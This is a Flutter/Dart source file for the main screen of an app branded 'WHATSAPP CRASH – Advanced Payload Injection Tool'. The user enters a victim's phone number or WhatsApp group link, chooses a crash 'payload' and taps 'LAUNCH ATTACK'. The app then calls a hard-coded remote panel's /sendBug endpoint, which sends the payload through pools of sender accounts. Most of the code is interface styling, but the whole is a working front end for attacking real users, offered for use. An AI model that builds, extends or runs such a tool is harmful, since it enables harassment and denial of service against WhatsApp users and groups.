import 'dart:convert';
import 'dart:math' as math;
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

// ─────────────────────────────────────────────────────────────
//  PALETTE – PUTIH + BIRU
// ─────────────────────────────────────────────────────────────
const Color _bg          = Color(0xFFFFFFFF);
const Color _bgCard      = Color(0xFFF5F8FA);
const Color _bgInput     = Color(0xFFF0F4F8);
const Color _border      = Color(0xFFE0E5EB);
const Color _textDark    = Color(0xFF1A1A2E);
const Color _textSub     = Color(0xFF6B7A8D);
const Color _blue        = Color(0xFF1A73E8);
const Color _blueLight   = Color(0xFF42A5F5);
const Color _blueBg      = Color(0xFFE8F0FE);
const Color _red         = Color(0xFFFF0040);

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final _targetCtrl = TextEditingController();
  late AnimationController _pulse;
  late AnimationController _enter;
  late AnimationController _scanCtrl;
  late VideoPlayerController _video;

  String _selectedBugId  = '';
  String _bugMode        = 'number';
  String _senderMode     = 'private';

  int    _privateCount   = 0;
  int    _globalCount    = 0;
  bool   _isSending      = false;
  bool   _videoReady     = false;

  @override
  void initState() {
    super.initState();

    _pulse = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1800))
      ..repeat(reverse: true);

    _enter = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1000))
      ..forward();

    _scanCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 6))
      ..repeat();

    _video = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        if (mounted) setState(() => _videoReady = true);
        _video.setLooping(true);
        _video.setVolume(1.0);
        _video.play();
      }).catchError((_) {});

    final bugs = _filteredBugs();
    if (bugs.isNotEmpty) _selectedBugId = bugs[0]['bug_id'];
    _fetchSenderStats();
  }

  @override
  void dispose() {
    _pulse.dispose();
    _enter.dispose();
    _scanCtrl.dispose();
    _video.dispose();
    _targetCtrl.dispose();
    super.dispose();
  }

  List<Map<String, dynamic>> _filteredBugs() {
    if (_bugMode == 'group') {
      return widget.listBug
          .where((b) => b['bug_id'].toString().contains('_group'))
          .toList();
    }
    return widget.listBug
        .where((b) => !b['bug_id'].toString().contains('_group'))
        .toList();
  }

  // ─── FETCH SENDER STATS ──────────────────────────────────────────────
  Future<void> _fetchSenderStats() async {
    try {
      // ─── PRIVATE: Sender milik user ini ──────────────────────────────
      final privateRes = await http.get(
        Uri.http('panel.gixsz.my.id:25792', '/mySender', {
          'key': widget.sessionKey,
        }),
      );

      int privateCount = 0;
      int globalCount = 0;

      if (privateRes.statusCode == 200) {
        final d = jsonDecode(privateRes.body);
        if (d['valid'] == true) {
          final conns = d['connections'] ?? [];
          privateCount = conns.length;
        }
      }

      // ─── GLOBAL: Semua sender dari semua user ──────────────────────────
      final globalRes = await http.get(
        Uri.http('panel.gixsz.my.id:25792', '/getSenderStats', {
          'key': widget.sessionKey,
        }),
      );

      if (globalRes.statusCode == 200) {
        final d = jsonDecode(globalRes.body);
        if (d['valid'] == true) {
          globalCount = d['global'] ?? 0;
        }
      }

      setState(() {
        _privateCount = privateCount;
        _globalCount = globalCount > 0 ? globalCount : privateCount;
      });

    } catch (_) {}
  }

  Future<void> _sendBug() async {
    HapticFeedback.heavyImpact();
    final raw = _targetCtrl.text.trim();
    final key = widget.sessionKey;

    if (_bugMode == 'number' && !_validPhone(raw)) {
      _showSnackbar('Gunakan format internasional: +62xxx', isError: true);
      return;
    }
    if (_bugMode == 'group' && !_validGroup(raw)) {
      _showSnackbar('Masukkan link grup WA yang valid.', isError: true);
      return;
    }

    final bugs = _filteredBugs();
    if (!bugs.any((b) => b['bug_id'] == _selectedBugId)) {
      if (bugs.isNotEmpty) {
        setState(() => _selectedBugId = bugs[0]['bug_id']);
      } else {
        _showSnackbar('Tidak ada payload tersedia.', isError: true);
        return;
      }
    }

    setState(() => _isSending = true);

    final bugId = _selectedBugId;
    final mode = _senderMode;

    try {
      final uri = Uri.http('panel.gixsz.my.id:25792', '/sendBug', {
        'key': key,
        'target': raw,
        'bug': bugId,
        'senderMode': mode,
      });

      final res = await http.get(uri);
      final d = jsonDecode(res.body);

      if (d['cooldown'] == true) {
        _showSnackbar('⏳ Cooldown, tunggu beberapa saat.', isError: true);
      } else if (d['valid'] == false) {
        _showSnackbar('Sesi habis, login ulang.', isError: true);
      } else if (d['sended'] == false) {
        _showSnackbar('Gagal kirim, coba lagi.', isError: true);
      } else {
        _showSnackbar('✅ Payload berhasil dikirim!', isError: false);
        _targetCtrl.clear();
        _fetchSenderStats();
      }
    } catch (e) {
      _showSnackbar('Koneksi error, coba lagi.', isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showSnackbar(String msg, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(isError ? Icons.error_outline : Icons.check_circle,
                color: Colors.white, size: 20),
            const SizedBox(width: 12),
            Expanded(child: Text(msg)),
          ],
        ),
        backgroundColor: isError ? Colors.red.shade700 : _blue,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(16),
        duration: const Duration(seconds: 3),
      ),
    );
  }

  bool _validPhone(String input) {
    final cleaned = input.replaceAll(RegExp(r'[\s\-\(\)]'), '');
    return RegExp(r'^\+?[1-9]\d{7,14}$').hasMatch(cleaned);
  }

  bool _validGroup(String input) {
    return input.startsWith('https://chat.whatsapp.com/') && 
           input.length > 26;
  }

  String _getCountryCode(String phone) {
    final cleaned = phone.replaceAll(RegExp(r'[\s\-\(\)]'), '');
    if (cleaned.startsWith('+62')) return '+62';
    if (cleaned.startsWith('+1')) return '+1';
    if (cleaned.startsWith('+44')) return '+44';
    if (cleaned.startsWith('+91')) return '+91';
    if (cleaned.startsWith('+81')) return '+81';
    if (cleaned.startsWith('+86')) return '+86';
    if (cleaned.startsWith('+60')) return '+60';
    if (cleaned.startsWith('+65')) return '+65';
    if (cleaned.startsWith('+63')) return '+63';
    if (cleaned.startsWith('+66')) return '+66';
    if (cleaned.startsWith('+84')) return '+84';
    if (cleaned.startsWith('+61')) return '+61';
    if (cleaned.startsWith('+64')) return '+64';
    if (cleaned.startsWith('+55')) return '+55';
    if (cleaned.startsWith('+52')) return '+52';
    if (cleaned.startsWith('+33')) return '+33';
    if (cleaned.startsWith('+49')) return '+49';
    if (cleaned.startsWith('+39')) return '+39';
    if (cleaned.startsWith('+34')) return '+34';
    if (cleaned.startsWith('+7')) return '+7';
    if (cleaned.startsWith('+971')) return '+971';
    if (cleaned.startsWith('+966')) return '+966';
    return '';
  }

  String _getCountryFlag(String phone) {
    final code = _getCountryCode(phone);
    switch (code) {
      case '+62': return '🇮🇩';
      case '+1': return '🇺🇸';
      case '+44': return '🇬🇧';
      case '+91': return '🇮🇳';
      case '+81': return '🇯🇵';
      case '+86': return '🇨🇳';
      case '+60': return '🇲🇾';
      case '+65': return '🇸🇬';
      case '+63': return '🇵🇭';
      case '+66': return '🇹🇭';
      case '+84': return '🇻🇳';
      case '+61': return '🇦🇺';
      case '+64': return '🇳🇿';
      case '+55': return '🇧🇷';
      case '+52': return '🇲🇽';
      case '+33': return '🇫🇷';
      case '+49': return '🇩🇪';
      case '+39': return '🇮🇹';
      case '+34': return '🇪🇸';
      case '+7': return '🇷🇺';
      case '+971': return '🇦🇪';
      case '+966': return '🇸🇦';
      default: return '🇮🇩';
    }
  }

  // ─── BUILD ──────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: Stack(
        children: [
          RepaintBoundary(
            child: AnimatedBuilder(
              animation: _scanCtrl,
              builder: (_, __) => CustomPaint(
                size: MediaQuery.of(context).size,
                painter: _BgPainterLight(t: _scanCtrl.value),
              ),
            ),
          ),
          SafeArea(
            child: CustomScrollView(
              physics: const BouncingScrollPhysics(),
              slivers: [
                SliverToBoxAdapter(child: _buildHeader()),
                SliverToBoxAdapter(child: _buildVideoCard()),
                SliverToBoxAdapter(child: _buildModeToggle()),
                SliverToBoxAdapter(child: _buildInputSection()),
                SliverToBoxAdapter(child: _buildPayloadDropdown()),
                SliverToBoxAdapter(child: _buildSenderSection()),
                SliverToBoxAdapter(child: _buildLaunchButton()),
                SliverToBoxAdapter(child: _buildFooter()),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── HEADER ────────────────────────────────────────────────────
  Widget _buildHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 18, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: _bgCard,
          border: Border.all(color: _border),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.04),
              blurRadius: 12,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _blueBg,
                borderRadius: BorderRadius.circular(12),
              ),
              child: FaIcon(FontAwesomeIcons.whatsapp, color: _blue, size: 24),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'WHATSAPP CRASH',
                    style: TextStyle(
                      color: _textDark,
                      fontWeight: FontWeight.w900,
                      fontSize: 16,
                      letterSpacing: 1.8,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Advanced Payload Injection Tool',
                    style: TextStyle(
                      color: _textSub,
                      fontSize: 10.5,
                      letterSpacing: 0.5,
                    ),
                  ),
                ],
              ),
            ),
            _RolePill(role: widget.role),
          ],
        ),
      ),
    );
  }

  // ─── VIDEO CARD ──────────────────────────────────────────────
  Widget _buildVideoCard() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
      child: Container(
        height: 170,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: _bgCard,
          border: Border.all(color: _border),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.04),
              blurRadius: 12,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        clipBehavior: Clip.antiAlias,
        child: Stack(
          fit: StackFit.expand,
          children: [
            if (_videoReady)
              FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _video.value.size.width,
                  height: _video.value.size.height,
                  child: VideoPlayer(_video),
                ),
              ),
            DecoratedBox(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    Colors.transparent,
                    Colors.black.withOpacity(0.3),
                  ],
                  stops: const [0.6, 1.0],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── MODE TOGGLE ──────────────────────────────────────────────
  Widget _buildModeToggle() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(4),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          color: _bgCard,
          border: Border.all(color: _border),
        ),
        child: Row(
          children: [
            _ModeTab(
              label: 'BUG NOMOR',
              icon: Icons.phone_android_rounded,
              selected: _bugMode == 'number',
              onTap: () => _switchMode('number'),
            ),
            _ModeTab(
              label: 'BUG GROUP',
              icon: Icons.group_rounded,
              selected: _bugMode == 'group',
              onTap: () => _switchMode('group'),
            ),
          ],
        ),
      ),
    );
  }

  void _switchMode(String m) {
    HapticFeedback.selectionClick();
    setState(() {
      _bugMode = m;
      _targetCtrl.clear();
      final bugs = _filteredBugs();
      if (bugs.isNotEmpty) _selectedBugId = bugs[0]['bug_id'];
    });
  }

  // ─── INPUT SECTION ─────────────────────────────────────────────
  Widget _buildInputSection() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: _bgCard,
          border: Border.all(color: _border),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 2,
                  height: 14,
                  decoration: BoxDecoration(
                    color: _blue,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const SizedBox(width: 10),
                Text(
                  _bugMode == 'number' ? 'TARGET NUMBER' : 'GROUP LINK',
                  style: const TextStyle(
                    color: _blue,
                    fontWeight: FontWeight.w700,
                    fontSize: 11,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            TextField(
              controller: _targetCtrl,
              style: const TextStyle(
                color: _textDark,
                fontSize: 15,
                fontWeight: FontWeight.w500,
              ),
              cursorColor: _blue,
              keyboardType: _bugMode == 'number'
                  ? TextInputType.phone
                  : TextInputType.url,
              onChanged: (_) => setState(() {}),
              decoration: InputDecoration(
                hintText: _bugMode == 'number'
                    ? '+62xxxxxxxxxx'
                    : 'https://chat.whatsapp.com/...',
                hintStyle: TextStyle(
                  color: _textSub.withOpacity(0.5),
                  fontSize: 13,
                ),
                filled: true,
                fillColor: _bgInput,
                prefixIcon: _bugMode == 'number'
                    ? Padding(
                        padding: const EdgeInsets.only(left: 12, right: 4),
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Text(
                              _getCountryFlag(_targetCtrl.text),
                              style: const TextStyle(fontSize: 22),
                            ),
                            if (_getCountryCode(_targetCtrl.text).isNotEmpty)
                              Padding(
                                padding: const EdgeInsets.only(left: 4),
                                child: Text(
                                  _getCountryCode(_targetCtrl.text),
                                  style: TextStyle(
                                    color: _textSub,
                                    fontSize: 13,
                                    fontWeight: FontWeight.w600,
                                  ),
                                ),
                              ),
                          ],
                        ),
                      )
                    : const Icon(Icons.link_rounded, color: _textSub),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                  borderSide: BorderSide.none,
                ),
                contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 18),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── PAYLOAD DROPDOWN ──────────────────────────────────────────
  Widget _buildPayloadDropdown() {
    final bugs = _filteredBugs();

    if (bugs.isEmpty) {
      return Padding(
        padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
        child: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            color: _bgCard,
            border: Border.all(color: _border),
          ),
          child: const Center(
            child: Text(
              'No payload available',
              style: TextStyle(color: _textSub),
            ),
          ),
        ),
      );
    }

    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: _bgCard,
          border: Border.all(color: _border),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 2,
                  height: 14,
                  decoration: BoxDecoration(
                    color: _blue,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const SizedBox(width: 10),
                const Text(
                  'SELECT PAYLOAD',
                  style: TextStyle(
                    color: _blue,
                    fontWeight: FontWeight.w700,
                    fontSize: 11,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12),
              decoration: BoxDecoration(
                color: _bgInput,
                borderRadius: BorderRadius.circular(12),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  dropdownColor: Colors.white,
                  value: bugs.any((b) => b['bug_id'] == _selectedBugId)
                      ? _selectedBugId
                      : bugs[0]['bug_id'],
                  isExpanded: true,
                  icon: Icon(Icons.arrow_drop_down, color: _textSub, size: 24),
                  style: TextStyle(
                    color: _textDark,
                    fontSize: 14,
                    fontWeight: FontWeight.w500,
                  ),
                  items: bugs.map((bug) {
                    return DropdownMenuItem<String>(
                      value: bug['bug_id'],
                      child: Row(
                        children: [
                          Container(
                            width: 8,
                            height: 8,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              color: bug['bug_id'] == _selectedBugId
                                  ? _blue
                                  : _textSub.withOpacity(0.3),
                            ),
                          ),
                          const SizedBox(width: 10),
                          Text(bug['bug_name'] ?? 'Unknown'),
                        ],
                      ),
                    );
                  }).toList(),
                  onChanged: (value) {
                    if (value != null) {
                      HapticFeedback.selectionClick();
                      setState(() => _selectedBugId = value);
                    }
                  },
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── SENDER SECTION ────────────────────────────────────────────
  Widget _buildSenderSection() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: _bgCard,
          border: Border.all(color: _border),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 2,
                  height: 14,
                  decoration: BoxDecoration(
                    color: _blue,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const SizedBox(width: 10),
                const Text(
                  'SENDER MODE',
                  style: TextStyle(
                    color: _blue,
                    fontWeight: FontWeight.w700,
                    fontSize: 11,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Row(
              children: [
                Expanded(
                  child: _SenderCard(
                    label: 'PRIVATE',
                    count: _privateCount,
                    selected: _senderMode == 'private',
                    onTap: () {
                      HapticFeedback.selectionClick();
                      setState(() => _senderMode = 'private');
                    },
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: _SenderCard(
                    label: 'GLOBAL',
                    count: _globalCount,
                    selected: _senderMode == 'global',
                    onTap: () {
                      HapticFeedback.selectionClick();
                      setState(() => _senderMode = 'global');
                    },
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ─── LAUNCH BUTTON ─────────────────────────────────────────────
  Widget _buildLaunchButton() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 20, 16, 0),
      child: AnimatedBuilder(
        animation: _pulse,
        builder: (_, __) {
          final g = _pulse.value;
          return SizedBox(
            width: double.infinity,
            height: 56,
            child: ElevatedButton(
              onPressed: _isSending ? null : _sendBug,
              style: ElevatedButton.styleFrom(
                backgroundColor: _blue,
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(14),
                ),
                elevation: 0,
                disabledBackgroundColor: _textSub.withOpacity(0.3),
                shadowColor: _blue.withOpacity(0.3 + 0.2 * g),
              ),
              child: _isSending
                  ? const SizedBox(
                      width: 24,
                      height: 24,
                      child: CircularProgressIndicator(
                        color: Colors.white,
                        strokeWidth: 2.5,
                      ),
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.rocket_launch_rounded,
                          color: Colors.white.withOpacity(0.9 + 0.1 * g),
                          size: 20,
                        ),
                        const SizedBox(width: 12),
                        Text(
                          'LAUNCH ATTACK',
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.9 + 0.1 * g),
                            fontWeight: FontWeight.w900,
                            fontSize: 14,
                            letterSpacing: 2,
                          ),
                        ),
                      ],
                    ),
            ),
          );
        },
      ),
    );
  }

  // ─── FOOTER ─────────────────────────────────────────────────────
  Widget _buildFooter() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 20, 16, 36),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Container(
            width: 16,
            height: 1,
            color: _textSub.withOpacity(0.3),
          ),
          const SizedBox(width: 10),
          Text(
            'SESSION: ${widget.expiredDate}',
            style: TextStyle(
              color: _textSub.withOpacity(0.5),
              fontSize: 10,
              letterSpacing: 1,
            ),
          ),
          const SizedBox(width: 10),
          Container(
            width: 16,
            height: 1,
            color: _textSub.withOpacity(0.3),
          ),
        ],
      ),
    );
  }
}

// ─── MODE TAB ─────────────────────────────────────────────────────
class _ModeTab extends StatelessWidget {
  final String label;
  final IconData icon;
  final bool selected;
  final VoidCallback onTap;

  const _ModeTab({
    required this.label,
    required this.icon,
    required this.selected,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    return Expanded(
      child: GestureDetector(
        onTap: onTap,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 220),
          padding: const EdgeInsets.symmetric(vertical: 10),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(9),
            color: selected ? _blue : Colors.transparent,
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                icon,
                color: selected ? Colors.white : _textSub,
                size: 16,
              ),
              const SizedBox(width: 6),
              Text(
                label,
                style: TextStyle(
                  color: selected ? Colors.white : _textSub,
                  fontSize: 12,
                  fontWeight: selected ? FontWeight.w700 : FontWeight.w500,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── SENDER CARD ─────────────────────────────────────────────────
class _SenderCard extends StatelessWidget {
  final String label;
  final int count;
  final bool selected;
  final VoidCallback onTap;

  const _SenderCard({
    required this.label,
    required this.count,
    required this.selected,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          color: selected ? _blueBg : _bgInput,
          border: Border.all(
            color: selected ? _blue : _border,
            width: selected ? 1.5 : 1,
          ),
        ),
        child: Column(
          children: [
            if (selected)
              Container(
                width: 4,
                height: 4,
                margin: const EdgeInsets.only(bottom: 6),
                decoration: const BoxDecoration(
                  shape: BoxShape.circle,
                  color: _blue,
                ),
              ),
            Text(
              label,
              style: TextStyle(
                color: selected ? _blue : _textSub,
                fontSize: 12,
                fontWeight: selected ? FontWeight.w700 : FontWeight.w500,
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              '$count ACTIVE',
              style: TextStyle(
                color: selected ? _blue.withOpacity(0.7) : _textSub,
                fontSize: 10,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── ROLE PILL ────────────────────────────────────────────────────
class _RolePill extends StatelessWidget {
  final String role;
  const _RolePill({required this.role});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        color: _blueBg,
        border: Border.all(color: _blue.withOpacity(0.3)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 4,
            height: 4,
            decoration: const BoxDecoration(
              shape: BoxShape.circle,
              color: _blue,
            ),
          ),
          const SizedBox(width: 6),
          Text(
            role.toUpperCase(),
            style: TextStyle(
              color: _blue,
              fontSize: 9,
              fontWeight: FontWeight.w700,
              letterSpacing: 1,
            ),
          ),
        ],
      ),
    );
  }
}

// ─── BACKGROUND PAINTER ──────────────────────────────────────────
class _BgPainterLight extends CustomPainter {
  final double t;
  const _BgPainterLight({required this.t});

  @override
  void paint(Canvas canvas, Size s) {
    canvas.drawRect(Offset.zero & s, Paint()..color = const Color(0xFFFFFFFF));

    final sy = s.height * ((t * 0.35) % 1.0);
    canvas.drawLine(
      Offset(0, sy),
      Offset(s.width, sy),
      Paint()
        ..color = const Color(0xFF1A73E8).withOpacity(0.05)
        ..strokeWidth = 1
        ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 2),
    );
  }

  @override
  bool shouldRepaint(_BgPainterLight o) => o.t != t;
}